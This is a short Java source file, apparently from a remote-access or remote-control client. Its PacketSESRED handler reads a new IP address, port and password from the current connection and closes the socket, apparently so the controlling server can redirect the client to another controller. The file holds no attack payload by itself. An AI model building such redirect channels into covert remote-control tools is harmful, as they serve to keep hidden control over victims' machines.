package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.Main;

public class PacketSESRED extends Packet {

	@Override
	public void read(String line) throws Exception {
		Main.ip = Connection.readLine();
		Main.port = Integer.parseInt(Connection.readLine());
		Main.pass = Connection.readLine();
		Connection.socket.close();
	}

}
